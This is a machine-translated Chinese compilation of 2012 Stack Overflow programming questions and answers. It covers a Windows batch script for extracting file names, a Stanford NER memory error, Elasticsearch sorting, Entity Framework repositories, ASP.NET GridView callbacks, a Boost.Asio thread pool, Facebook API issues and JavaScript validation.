考虑到可能有多个包含多个文件的更改集部分并且文件路径可能不同，我该如何实现这一点？

我认为可以使用 GREP 或 FINDSTR 命令隔离行以仅提取文件路径，然后创建一个使用数组提取文件名并将它们发布到不同文本文件的小型应用程序。

$/项目名称/Folder1/Binary.File1.cs

$/项目名称/Folder1/Folder2/SQL_File2.sql

$/项目名称/Folder1/Folder2/Folder3/File3.png

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:49:45.203

假设您的 tf 历史输出作为文件调用 tf.list，此批处理将产生所需的结果：

```
for /F "delims=$ tokens=1,*" %%a in (tf.list) do if NOT !%%b!==!! call :line "%%b"

goto :eof

:line
set filename=%~n1%~x1
echo %filename%
goto :eof 
```

# java - 使用 Netbeans 的斯坦福 NER 上的 Java 堆空间错误

> ID：12215372
> 
> 赞同：0
> 
> 时间：2012-08-31T12:26:00.270
> 
> 标签：java, nlp, netbeans-7, stanford-nlp

我正在使用斯坦福 NER 解析一个句子以获取以下标签：tokenize、ssplit、pos、lemma、ner。我还通过 Project->Properties->Run->VM Options 增加了 netbeans 中的内存`-Xms1600M -Xmx1600M`。我仍然让 Java 内存不足异常。我在 Windows 7 JDK 1.7 版上运行 32 位 java。这是我的代码

```
public ArrayList<String> NERTokensRet(String string) {
    ArrayList<String> myArr = new ArrayList<String>();

    props = new Properties();
    props.put("annotators", "tokenize,ssplit,pos,lemma,ner");
    pipeline = new StanfordCoreNLP(props);

    //     String resultString = string.replaceAll("[^\\p{L}\\p{N}]", " ");   
    Annotation annotation = new Annotation(string);
    pipeline.annotate(annotation);
    int j;
    for (CoreMap sentence : annotation.get(CoreAnnotations.SentencesAnnotation.class)) {
        List<CoreLabel> tokens = sentence.get(CoreAnnotations.TokensAnnotation.class);

        for (j = 0; j < tokens.size(); j++) {
            CoreLabel token = tokens.get(j);
            myArr.add("[" + token.originalText() + "," + token.tag() + "," + token.beginPosition() + "," + token.endPosition() + "]");
        }
        //System.out.println(myArr);
    }

    return myArr;
} 
```

堆栈跟踪 ：

```
Exception in thread "main" java.lang.OutOfMemoryError: Java heap space
at java.lang.AbstractStringBuilder.<init>(AbstractStringBuilder.java:45)
at java.lang.StringBuilder.<init>(StringBuilder.java:68)
at java.io.ObjectInputStream$BlockDataInputStream.readUTFBody(ObjectInputStream.java:2998)
at java.io.ObjectInputStream$BlockDataInputStream.readUTF(ObjectInputStream.java:2819)
at java.io.ObjectInputStream.readString(ObjectInputStream.java:1598)
at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1319)
at java.io.ObjectInputStream.readObject(ObjectInputStream.java:350)
at java.util.HashMap.readObject(HashMap.java:1030)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
at java.lang.reflect.Method.invoke(Method.java:597)
at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:974)
at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1848)
at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1752)
at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1328)
at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1946)
at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1870)
at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1752)
at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1328)
at java.io.ObjectInputStream.readObject(ObjectInputStream.java:350)
at edu.stanford.nlp.ie.crf.CRFClassifier.loadClassifier(CRFClassifier.java:2255)
at edu.stanford.nlp.ie.AbstractSequenceClassifier.loadClassifier(AbstractSequenceClassifier.java:1444)
at edu.stanford.nlp.ie.AbstractSequenceClassifier.loadClassifier(AbstractSequenceClassifier.java:1421)
at edu.stanford.nlp.ie.AbstractSequenceClassifier.loadClassifier(AbstractSequenceClassifier.java:1500)
at edu.stanford.nlp.ie.AbstractSequenceClassifier.loadClassifier(AbstractSequenceClassifier.java:1487)
at edu.stanford.nlp.ie.crf.CRFClassifier.getClassifier(CRFClassifier.java:2386)
at edu.stanford.nlp.ie.ClassifierCombiner.loadClassifierFromPath(ClassifierCombiner.java:130)
at edu.stanford.nlp.ie.ClassifierCombiner.loadClassifiers(ClassifierCombiner.java:116)
at edu.stanford.nlp.ie.ClassifierCombiner.<init>(ClassifierCombiner.java:98)
at edu.stanford.nlp.ie.NERClassifierCombiner.<init>(NERClassifierCombiner.java:64)
at edu.stanford.nlp.pipeline.StanfordCoreNLP$6.create(StanfordCoreNLP.java:500) 
```

有人可以尽快提供帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-02T19:11:42.243

堆栈跟踪显示 java 在加载用于 CoreNLP 中 NER 的大型模型（特征和权重）时内存不足。这些确实使用了大量的内存，但这仍然**非常**令人惊讶。你没有说你使用的是什么操作系统，什么JDK版本，是否是32/64位等等。但是对于您上面的程序（添加了一个 main 方法并填充了几个类型），在 Linux（CentOS 5）上的 Java 7u5 上，我可以使用 -mx700m 运行它（使用 32 位或 64 位 Java - 耶压缩哎呀）。所以我认为 1600m 对于任何架构/版本都应该足够了。

所以，我会尝试：

*   使用更多内存运行并查看是否会改变（例如 -mx1800m）
*   如果没有，请确保 VM 确实获得了您在上面声明的内存量（即使您编写的内容看起来正确）。例如，尝试打印 Runtime.getRuntime().maxMemory() / 1024 / 1024。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-03T13:44:42.887

我卸载了所有东西（java和netbeans）并重新安装了所有东西（java和netbeans）。它仍然无法分配 -Xmx1400m 但分配 -Xmx1000m 并且运行良好。谢谢大家的努力。

# sorting - 对 Elasticsearch 中的几个字段进行排序

> ID：12215380
> 
> 赞同：0
> 
> 时间：2012-08-31T12:26:28.167
> 
> 标签：sorting, elasticsearch

我正在使用 Elasticsearch 进行搜索，并想了解如何在 Java 中的多个字段上添加排序，如下所述：

[http://www.elasticsearch.org/guide/reference/api/search/sort.html](http://www.elasticsearch.org/guide/reference/api/search/sort.html)

在准备搜索时，我只成功地添加了一个排序构建器。

谢谢，

斯廷

* * *

这就是我在单个字段上添加排序的方式：

```
client.prepareSearch(indexName).setTypes(typeName)
      .setQuery(query)
      .addSort(fieldSort("activity").order(DESC).missing("_last"))
      .setSize(limit)
      .execute().actionGet(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-11T08:10:47.150

`.missing("_last")`不能应用于布尔字段。

# .net - 对这种方法的思考：EF5 Code First、Repository Pattern、UofW 等

> ID：12215383
> 
> 赞同：0
> 
> 时间：2012-08-31T12:26:33.183
> 
> 标签：.net, entity-framework-5

我一直在浏览大量关于 EF Code First、存储库、工作单元等的博客/文档/等。

我正在尝试为我的下一个项目创建一个方便的框架来处理：

1.  Web 环境 (HttpContext) 和独立环境（例如 Windows 服务）
2.  让我可以选择为特定实体定义存储库或使用通用存储库进行简单查询。

我决定不将 EF 封装在我的存储库中。我看不出我们什么时候会考虑切换到不同的 ORM。

所以我想出了以下内容，我很乐意听取意见！:)

```
namespace Data.Repositories
{
internal class DbContextInstance
{
    public static readonly DbContext Context;

    static DbContextInstance()
    {
        if (System.Web.HttpContext.Current != null)
        {
            if (System.Web.HttpContext.Current.Items["__DBCONTEXT"] == null)
                System.Web.HttpContext.Current.Items["__DBCONTEXT"] = new MyDbContext();

            Context = System.Web.HttpContext.Current.Items["__DBCONTEXT"] as MyDbContext;
        }
        else
        {
            if (Context == null)
                Context = new MyDbContext();
        }
    }
}

public class GenericRepository<TEntity> : IDisposable where TEntity : class
{
    //Implementation of repo. Similar to GenericRepository here: http://www.asp.net/mvc/tutorials/getting-started-with-ef-using-mvc/implementing-the-repository-and-unit-of-work-patterns-in-an-asp-net-mvc-application
    //whenever I need to access the context I'm using DbContextInstance.Context 
} 
```

在上面的通用存储库中，我不需要担心传递 DbContext（就像我提到的链接中一样），因为 DbContextInstance 担心这一点。这是我可以配置连接字符串等的一个点。我保持这部分简单，但我们可以增强它以从某个地方读取连接字符串名称。

Generic Repo 是 IDisposable - 在 Dispose 方法中我处理 Context。上面的代码确保会话中不超过一个上下文（HTTP 请求或 EXE 应用程序的生命周期）。当然，只要不处理。

工作单元类将简单地实例化 repos 并与它们交互。它们也将是 IDisposable 并将处理存储库。

我将对数据库进行测试和模型。我将有一个用于重置数据库并预先填充初始数据的脚本。我发现最好针对真实事物进行测试，而不是一些模拟事物的模型。

这段代码是来自不同地方的点点滴滴+我自己的一些创造力..

当应用程序已经启动并运行时，你能看到任何可能导致痛苦的事情吗？扔到我脸上！;)

谢谢！:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T12:32:45.230

上下文应该是短暂的——你的代码似乎暗示你的上下文将有很长的生命周期并被共享。这会让你感到悲伤。

# c# - 在 asp.net 中从 ClientSide (Javascript) 刷新 GridView

> ID：12215384
> 
> 赞同：1
> 
> 时间：2012-08-31T12:26:32.800
> 
> 标签：c#, javascript, asp.net, gridview

我在网页上添加了 Gridview 控件。

**我通过调用PageMethod**删除任何行（一次一行），如下所示：

```
 <script type="text/javascript">
      function Delete_Row(){
        PageMethods.DeleteRow(row_id, GetTimeCallback, ErrorHandler, TimeOutHandler);
      }
      GetTimeCallback = function (result) 
      {
         if (result) {
            alert('Row is deleted');
            // I want to refresh the Gridview here
          }
      }
    <script type="text/javascript"> 
```

其中“ **row_id** ”是该行的主键。

它完美地显示了警报，但不会用少一个删除的行刷新 Gridview。
我应该写什么代码来更新gridview？
**注意：**我不想刷新整个页面。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:49:26.983

编写**回调**函数来实现这一点......您可以在[http://msdn.microsoft.com/en-us/library/ms178208](http://msdn.microsoft.com/en-us/library/ms178208)和[http://msdn.microsoft.com/en-us/library/找到回调功能ms178210](http://msdn.microsoft.com/en-us/library/ms178210)

**编辑：-**

```
 protected void Page_Load(object sender, EventArgs e)
   {
    String cbReference =Page.ClientScript.GetCallbackEventReference(this,
        "arg", "ReceiveServerData", "context");
    String callbackScript;
    callbackScript = "function CallServer(arg, context)" +
        "{ " + cbReference + ";}";
    Page.ClientScript.RegisterClientScriptBlock(this.GetType(),
        "CallServer", callbackScript, true);

   }

 System.IO.StringWriter strDataGridHtml= new System.IO.StringWriter(); 

 public void RaiseCallbackEvent(String eventArgument)
    {
         string idToBeDeleted=eventArgument;
         //Write deleteCode
         //DataBind the Grid
         HtmlTextWriter htwObject = new HtmlTextWriter(strDataGridHtml);
         GridViewControl.RenderControl(htwObject);
    }        

public String GetCallbackResult()
    {
        return strDataGridHtml.ToString();
    } 
```

现在，正如您所见，这个**strDataGridHtml**将被发送到 Javascript 函数 ReceiveServerData...

```
<script type="text/ecmascript">

    function ReceiveServerData(rValue)
    {   
        document.getElementById("divIDWhichEncapsulategridView").innerHTML = rValue;

    }
  </script> 
```

希望这会对您有所帮助..由于我没有您的完整代码，因此我无法编写确切的代码...但这应该使您对如何继续进行一些想法...并且还请通过“回调" 功能，以便充分了解此功能..

# c# - 向数据视图的列中的每一行添加下拉列表

> ID：12215389
> 
> 赞同：0
> 
> 时间：2012-08-31T12:26:52.730
> 
> 标签：c#, .net, asp.net-3.5, dataview

我有一个包含以下列的数据视图：

```
<Columns>  
    <asp:BoundField DataField="report_type" HeaderText="Report Type" ReadOnly="True" SortExpression="report_type"/>  
    <asp:BoundField DataField="progress" HeaderText="Progress" SortExpression="progress"/>  
</Columns> 
```

这工作正常，它显示来自数据库的记录。

如何替换进度列并使其包含每一行的下拉列表？下拉列表包含`complete`和`incomplete`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:32:10.283

您可以使用模板列来自定义您的渲染

```
<asp:TemplateField HeaderText="..">
  <ItemTemplate>
     <asp:DropDownList ID="DropDownList1" runat="server">
     </asp:DropDownList>
  </ItemTemplate>
</asp:TemplateField> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:41:59.747

如果要在编辑模式下使用下拉列表，则：

```
 <asp:TemplateField HeaderText="..">
   <ItemTemplate>
      <%# Eval("progress") %>
   </ItemTemplate>
   <EditItemTemplate>
      <asp:DropDownList ID="ddlProgress" runat="server" DataTextField="progress" />
   </EditItemTemplate>
 </asp:TemplateField> 
```

# c++ - 使用boost asio的线程池

> ID：12215395
> 
> 赞同：23
> 
> 时间：2012-08-31T12:27:02.170
> 
> 标签：c++, threadpool, boost-asio

我正在尝试使用 boost::asio 创建一个有限的线程池类。但是我被困在某一点上可以有人帮助我。

唯一的问题是我应该减少计数器的地方？

代码没有按预期工作。

问题是我不知道我的线程何时完成执行以及如何知道它已返回池

```
#include <boost/asio.hpp>
#include <iostream>
#include <boost/thread/thread.hpp>
#include <boost/bind.hpp>
#include <boost/thread/mutex.hpp>
#include <stack>

using namespace std;
using namespace boost;

class ThreadPool
{
    static int count;
    int NoOfThread;
    thread_group grp;
    mutex mutex_;
    asio::io_service io_service;
    int counter;
    stack<thread*> thStk ;

public:
    ThreadPool(int num)
    {   
        NoOfThread = num;
        counter = 0;
        mutex::scoped_lock lock(mutex_);

        if(count == 0)
            count++;
        else
            return;

        for(int i=0 ; i<num ; ++i)
        {
            thStk.push(grp.create_thread(boost::bind(&asio::io_service::run, &io_service)));
        }
    }
    ~ThreadPool()
    {
        io_service.stop();
        grp.join_all();
    }

    thread* getThread()
    {
        if(counter > NoOfThread)
        {
            cout<<"run out of threads \n";
            return NULL;
        }

        counter++;
        thread* ptr = thStk.top();
        thStk.pop();
        return ptr;
    }
};
int ThreadPool::count = 0;

struct callable
{
    void operator()()
    {
        cout<<"some task for thread \n";
    }
};

int main( int argc, char * argv[] )
{

    callable x;
    ThreadPool pool(10);
    thread* p = pool.getThread();
    cout<<p->get_id();

    //how i can assign some function to thread pointer ?
    //how i can return thread pointer after work done so i can add 
//it back to stack?

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2012-09-04T15:52:26.617

简而言之，您需要用另一个函数包装用户提供的任务，该函数将：

*   调用用户函数或可调用对象。
*   锁定互斥锁并递减计数器。

* * *

我可能不了解此线程池的所有要求。因此，为了清楚起见，这里有一个关于我认为是要求的明确列表：

*   池管理线程的生命周期。用户不应该能够删除驻留在池中的线​​程。
*   用户可以以非侵入方式将任务分配给池。
*   分配任务时，如果池中的所有线程当前都在运行其他任务，则丢弃该任务。

在提供实现之前，我想强调几个关键点：

*   一旦一个线程被启动，它将一直运行直到完成、取消或终止。线程正在执行的函数不能被重新分配。为了允许单个线程在其生命周期中执行多个函数，线程将希望使用将从队列中读取的函数启动，例如`io_service::run()`，并将可调用类型发布到事件队列中，例如 from `io_service::post()`。
*   `io_service::run()`如果 中没有待处理的工作，则返回`io_service`，`io_service`停止，或者线程正在运行的处理程序抛出异常。为了防止`io_serivce::run()`在没有未完成的工作时返回，`io_service::work`可以使用该类。
*   定义任务的类型要求（即任务的类型必须可通过`object()`语法调用）而不是要求类型（即任务必须继承自`process`），为用户提供了更大的灵活性。它允许用户提供任务作为函数指针或提供 nullary 的类型`operator()`。

使用实现`boost::asio`：

```
#include <boost/asio.hpp>
#include <boost/thread.hpp>

class thread_pool
{
private:
  boost::asio::io_service io_service_;
  boost::asio::io_service::work work_;
  boost::thread_group threads_;
  std::size_t available_;
  boost::mutex mutex_;
public:

  /// @brief Constructor.
  thread_pool( std::size_t pool_size )
    : work_( io_service_ ),
      available_( pool_size )
  {
    for ( std::size_t i = 0; i < pool_size; ++i )
    {
      threads_.create_thread( boost::bind( &boost::asio::io_service::run,
                                           &io_service_ ) );
    }
  }

  /// @brief Destructor.
  ~thread_pool()
  {
    // Force all threads to return from io_service::run().
    io_service_.stop();

    // Suppress all exceptions.
    try
    {
      threads_.join_all();
    }
    catch ( const std::exception& ) {}
  }

  /// @brief Adds a task to the thread pool if a thread is currently available.
  template < typename Task >
  void run_task( Task task )
  {
    boost::unique_lock< boost::mutex > lock( mutex_ );

    // If no threads are available, then return.
    if ( 0 == available_ ) return;

    // Decrement count, indicating thread is no longer available.
    --available_;

    // Post a wrapped task into the queue.
    io_service_.post( boost::bind( &thread_pool::wrap_task, this,
                                   boost::function< void() >( task ) ) );
  }

private:
  /// @brief Wrap a task so that the available count can be increased once
  ///        the user provided task has completed.
  void wrap_task( boost::function< void() > task )
  {
    // Run the user supplied task.
    try
    {
      task();
    }
    // Suppress all exceptions.
    catch ( const std::exception& ) {}

    // Task has finished, so increment count of available threads.
    boost::unique_lock< boost::mutex > lock( mutex_ );
    ++available_;
  }
}; 
```

关于实现的几点评论：

*   异常处理需要围绕用户的任务进行。如果用户的函数或可调用对象抛出非 type 的异常，`boost::thread_interrupted`则`std::terminate()`调用。这是 Boost.Thread[在线程函数](http://www.boost.org/doc/libs/1_51_0/doc/html/thread/thread_management.html#thread.thread_management.tutorial.exceptions)行为中出现异常的结果。[Boost.Asio从 handlers 抛出异常](http://www.boost.org/doc/libs/1_51_0/doc/html/boost_asio/reference/io_service.html#boost_asio.reference.io_service.effect_of_exceptions_thrown_from_handlers)的效果也值得一读。
*   如果用户提供`task`via `boost::bind`，则嵌套`boost::bind`将无法编译。需要以下选项之一：
    *   不支持`task`由`boost::bind`.
    *   元编程根据用户的类型是否可以使用结果来执行编译时分支，因为`boost::bind`只有在某些函数对象上才能正确运行。`boost::protect``boost::protect`
    *   `task`使用另一种类型间接传递对象。我选择以`boost::function`丢失确切类型为代价来提高可读性。 `boost::tuple`，虽然可读性稍差，但也可用于保留确切的类型，如 Boost.Asio 的[序列化](http://www.boost.org/doc/libs/1_51_0/doc/html/boost_asio/example/serialization/connection.hpp)示例所示。

应用程序代码现在可以`thread_pool`非侵入性地使用该类型：

```
void work() {};

struct worker
{
  void operator()() {};
};

void more_work( int ) {};

int main()
{ 
  thread_pool pool( 2 );
  pool.run_task( work );                        // Function pointer.
  pool.run_task( worker() );                    // Callable object.
  pool.run_task( boost::bind( more_work, 5 ) ); // Callable object.
} 
```

可以在没有 Boost.Asio的`thread_pool`情况下创建，并且对维护者来说可能稍微容易一些，因为他们不再需要了解`Boost.Asio`行为，例如何时`io_service::run()`返回以及`io_service::work`对象是什么：

```
#include <queue>
#include <boost/bind.hpp>
#include <boost/thread.hpp>

class thread_pool
{
private:
  std::queue< boost::function< void() > > tasks_;
  boost::thread_group threads_;
  std::size_t available_;
  boost::mutex mutex_;
  boost::condition_variable condition_;
  bool running_;
public:

  /// @brief Constructor.
  thread_pool( std::size_t pool_size )
    : available_( pool_size ),
      running_( true )
  {
    for ( std::size_t i = 0; i < pool_size; ++i )
    {
      threads_.create_thread( boost::bind( &thread_pool::pool_main, this ) ) ;
    }
  }

  /// @brief Destructor.
  ~thread_pool()
  {
    // Set running flag to false then notify all threads.
    {
      boost::unique_lock< boost::mutex > lock( mutex_ );
      running_ = false;
      condition_.notify_all();
    }

    try
    {
      threads_.join_all();
    }
    // Suppress all exceptions.
    catch ( const std::exception& ) {}
  }

  /// @brief Add task to the thread pool if a thread is currently available.
  template < typename Task >
  void run_task( Task task )
  {
    boost::unique_lock< boost::mutex > lock( mutex_ );

    // If no threads are available, then return.
    if ( 0 == available_ ) return;

    // Decrement count, indicating thread is no longer available.
    --available_;

    // Set task and signal condition variable so that a worker thread will
    // wake up andl use the task.
    tasks_.push( boost::function< void() >( task ) );
    condition_.notify_one();
  }

private:
  /// @brief Entry point for pool threads.
  void pool_main()
  {
    while( running_ )
    {
      // Wait on condition variable while the task is empty and the pool is
      // still running.
      boost::unique_lock< boost::mutex > lock( mutex_ );
      while ( tasks_.empty() && running_ )
      {
        condition_.wait( lock );
      }
      // If pool is no longer running, break out.
      if ( !running_ ) break;

      // Copy task locally and remove from the queue.  This is done within
      // its own scope so that the task object is destructed immediately
      // after running the task.  This is useful in the event that the
      // function contains shared_ptr arguments bound via bind.
      {
        boost::function< void() > task = tasks_.front();
        tasks_.pop();

        lock.unlock();

        // Run the task.
        try
        {
          task();
        }
        // Suppress all exceptions.
        catch ( const std::exception& ) {}
      }

      // Task has finished, so increment count of available threads.
      lock.lock();
      ++available_;
    } // while running_
  }
}; 
```

# facebook-javascript-sdk - API 错误代码：191 仅出现在 Page Tab 应用程序中

> ID：12215397
> 
> 赞同：0
> 
> 时间：2012-08-31T12:27:06.000
> 
> 标签：facebook-javascript-sdk, facebook-php-sdk

仅当应用程序位于页面选项卡中时，我才会出现此错误：

API 错误代码：191 API 错误描述：指定的 URL 不属于应用程序 错误消息：redirect_uri 不属于应用程序。

在页面标签[http://www.facebook.com/pages/ConMar/268459383261877?sk=app_148000545338378](http://www.facebook.com/pages/ConMar/268459383261877?sk=app_148000545338378)如果您点击“Invita Amici”，您会看到错误。

但是使用 facebbok 中的应用程序我没有问题，它工作正常：[http ://apps.facebook.com/family-and-friends/](http://apps.facebook.com/family-and-friends/)

“URL 画布：”和“页面标签 URL：”都设置为：“http://www.d4v1d3.com/family-friends/”

我使用示例代码：

FB.init({ appId : 'xxxxxxxxxx',frictionlessRequests: true });

```
 function sendRequestViaMultiFriendSelector() {
    FB.ui({method: 'apprequests',
      message: 'My Great Request'
    }, requestCallback);
  } 
```

你知道为什么我只是在页面标签的情况下出现错误吗？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T02:33:21.517

转到您的应用程序设置并在基本设置下进行其他配置。

如果您的域名是[http://inspiration.nyp.edu.sg](http://inspiration.nyp.edu.sg)

![在此处输入图像描述](../Images/d690edfb41d808f458a0ba3459368b0f.png)

如果您在本地主机上工作

![在此处输入图像描述](../Images/bc4f4cabb7479cb0b65ff461bc8116e3.png)

您可以参考[发送消息并在自己的墙上发帖功能不再起作用](https://stackoverflow.com/questions/12027511/sending-msg-and-post-on-own-wall-function-no-longer-work/12257802#12257802)以获取更多信息。

# php - 如何在 Facebook 的 PHP SDK 中获取全尺寸头像？

> ID：12215400
> 
> 赞同：3
> 
> 时间：2012-08-31T12:27:15.847
> 
> 标签：php, facebook, facebook-graph-api, facebook-php-sdk

如何在 Facebook 的 PHP SDK 中获取一个人的全尺寸头像？我知道这个`?type=large`方法，但结果只有 200px 宽。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T12:41:24.973

如果`?type=large`只返回一个 200 像素宽的图像，那么这是 Facebook 拥有的最大的图像。

您可以通过在查询字符串中指定宽度和高度来放大图像：`?width=300&height=300`Facebook 将返回图像的放大版本。有关更多信息，请参阅[此博客文章](https://developers.facebook.com/blog/post/2012/08/22/platform-updates--operation-developer-love/)。

这个限制似乎比 Facebook 拥有的最大存储图像的大小大 75%。例如，我的大型个人资料图片约为 180 像素。如果我请求宽度或高度 > 312，我会返回一个 312 像素的图像。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:40:31.967

```
http://graph.facebook.com/YOURNAME/picture 
```

替换`YOURNAME`为您要获取照片的用户的名称。

另请参阅： [Facebook API - 如何通过 Facebook API 获取 Facebook 用户的个人资料图片（无需用户“允许”应用程序）](https://stackoverflow.com/questions/2821061/facebook-api-how-do-i-get-a-facebook-users-profile-image-through-the-fb-api)

# frameworks - 用于小型开发人员维护网站的 CMS 或 PHP 框架 - 通过 git 进行内容管理？

> ID：12215401
> 
> 赞同：0
> 
> 时间：2012-08-31T12:27:19.020
> 
> 标签：frameworks, content-management-system

我正在建设，并将维护一个小型站点作为个人项目。

*   我希望能够偶尔更新一些页面，包括博客的常规帖子，并且能够轻松地更改网站的设计。

    理想情况下，我希望能够管理所有内容，包括通过 git 发布博客文章，这样我就可以像以前那样用纯文本/HTML 编写，而无需通过在线编辑器或管理区域进行更改.

    同时，我想让这个的编码尽可能简单，比如把一篇文章写成一个html文件，把一些元数据添加到一个单独的xml文件中。

Wordpress、get-simple CMS、concrete5 和我看过的许多其他东西都没有。

什么方法被认为最适合构建只有开发人员才能维护的小型站点，并允许快速有效地控制内容和元数据的各个方面。

我更熟悉 PHP，但如果基于 python 的系统有很大的优势，那也很酷。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T14:15:04.657

Better you have go with `JOOMLA` . This was best `CMS` and you can manage all the datas like Article, Blog Posts, etc..

This was also have user friendly administrator section. So any person including non-technical person can manage the website.

[Joomla Demo Administrator](http://demo.opensourcecms.com/joomla/administrator)

[Joomla Demo Site](http://www.opensourcecms.com/demo/1/38/Joomla)

```
ADMIN USERNAME: admin

ADMIN PASSWORD: demo123 
```

Choice is urs... All the best...

# javascript - Array.push 导致程序出错

> ID：12215413
> 
> 赞同：0
> 
> 时间：2012-08-31T12:28:31.343
> 
> 标签：javascript, arrays, loops, push, prompt

我按照上一个问题的建议让我的提示将值添加到数组中，但它导致我的程序在它们不是时抛出 True 值。

```
HIGHEST_GRADE = 7;
LOWEST_GRADE = 0;

var course = new Array();
var grade = new Array();

while(confirm("Would you like to add a course?")){
    course.push( prompt("Enter the course code. Example - ABC1234") );
};

var upperTest = course.slice(0,3);
var integerTest = course.slice(4,7);

if (course.length !== 7) {
    alert ('Invalid Course Code');
}

if (upperTest !== upperTest.toUpperCase()) {
     alert ('Invalid Course Code');
}

if (isNaN(integerTest)) {
    alert('Invalid Course Code'); 
}

if (isNaN(grade)) {
    alert('Invalid Grade');
}

if (LOWEST_GRADE > grade || HIGHEST_GRADE < grade) {
    alert('Invalid Grade');
} 
```

我设置它以确保输入的文本与条件匹配，但是由于添加了 .push ，所以整个事情都搞砸了。

我收到了一个无效的课程代码错误，这是有问题的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:31:42.597

`Array`用于存储多个课程，这很好。但是，由于它是一个数组，因此您需要使用循环访问它的每个位置以验证每个*单独*的课程：

```
var courses = new Array();  // use the name courses instead, to indicate that it's a collection

for (var i = 0; i < courses.length; i++) {
  var course = courses[i];

  var upperTest = course.slice(0,3);
  var integerTest = course.slice(4,7);

  if (course.length !== 7) {
    alert ('Invalid Course Code');
  }

  if (upperTest !== upperTest.toUpperCase()) {
    alert ('Invalid Course Code');
  }

  if (isNaN(integerTest)) {
    alert('Invalid Course Code'); 
  }
} 
```

这将验证`course`. `Array`否则，当您测试时`courses.length`，您将验证数组中的元素数量，*而不是*每门课程的字符数。

`grades`数组也需要这样做。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:33:11.533

您要验证输入的课程代码吗？在这种情况下，您需要使用项目而不是整个数组：

```
while (confirm("...")) {
  var courseCode = prompt("...");

  var upperTest = course.slice(0,3);
  var integerTest = course.slice(4,7);

  if (courseCode.length !== 7) {
    alert ('Invalid Course Code');
    continue;
  }

  // place your other if's here

  courses.push(courseCode);
} 
```

# javascript - 在浏览器之前滚动不可见元素

> ID：12215414
> 
> 赞同：0
> 
> 时间：2012-08-31T12:28:32.177
> 
> 标签：javascript, jquery, css

我在关注不可见元素时遇到了问题。标记：

```
<div id="outer">
    <div id="inner" style="top: 0;">
        <div class="group" style="background: red;"><a href="#">X</a></div>
        <div class="group" style="background: blue;"><a href="#">Y</a></div>
        <div class="group" style="background: green;"><a href="#">Z</a></div>
    </div>
</div>

<button onclick="document.getElementById('inner').style.top = '-182px';">Down</button> 
```

和CSS：

```
#outer {
    width: 300px;
    height: 182px;
    overflow: hidden;
    background: black;
}
#inner { position: relative; }
.group { width: 300px; height: 182px; background: red;} 
```

当我按下“向下”按钮时，内部的样式变为“顶部：-182px”，这在功能上只是显示另一组项目。组件基本上用作垂直组滑块。在我使用“Tab”之前，一切都运行良好。就在滑块显示下一个组之前，浏览器会自动移动内部 div，而不更改其上的任何属性。

浏览器从 DOM 或其他任何地方进行偏移是否有任何更改？我知道焦点滚动是默认的浏览器功能，所以我不会与浏览器对抗，我很确定我不能禁用这种滚动。

我发现浏览器会在任何 js 代码执行之前滚动。有没有办法在浏览器之前拦截焦点事件和滚动？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T15:08:40.803

为什么不使用更多的 JS？我已经分叉了你的 JSfiddle 以使用原始 JS，尽管我会使用 jQuery 让它更干净。

[http://jsfiddle.net/bldoron/wMXpt/4/](http://jsfiddle.net/bldoron/wMXpt/4/)

基本上我会遍历元素并显式隐藏不相关的元素，而不是使用 css 规则隐式隐藏。

您需要检查我们是否通过了最后一个节点，但您得到了图片。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T16:38:41.320

看看这个：http: [//jsfiddle.net/byTLg/8/](http://jsfiddle.net/byTLg/8/)。有用！小提琴会比我解释得更多）

# javascript - 显示/隐藏 http/ftp 链接？

> ID：12215421
> 
> 赞同：0
> 
> 时间：2012-08-31T12:29:16.857
> 
> 标签：javascript, html

我在 HTML 中有想要隐藏的链接，如下所示：

```
007 - Dalla Russia con amore (1963) Full Blu Ray ....
http://somewhere.example.com/1
007 - L'uomo dalla pistola d'oro (1974) Full Blu Ray 1....
http://somewhere.example.com/2
007 Operazione Tuono (1965) Full Bluray 43.9 GB...
http://somewhere.example.com/3
http://somewhere.example.com/4
007 Vendetta privata (1989) Full Blu ray ....
http://somewhere.example.com/5 
```

我想要这个结果：

```
007 - Dalla Russia con amore (1963).....
007 - L'uomo dalla pistola d'oro (1974) Full B...
007 Operazione Tuono (1965) Full Bluray 43...
007 Vendetta privata (1989) Full Bl... 
```

我想要一个代码，让我可以单独查看每个标题：

```
007 - Dalla Russia con amore (1963) Full Blu Ray 39,6 GB AVC DTS-HD 5.1
http://somewhere.example.com/1
07 - L'uomo dalla pistola d'oro (1974) Full B...
007 Operazione Tuono (1965) Full Bluray 43...
007 Vendetta privata (1989) Full Bl... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:41:39.870

好吧，如果是这种情况，我会考虑使用 jquery

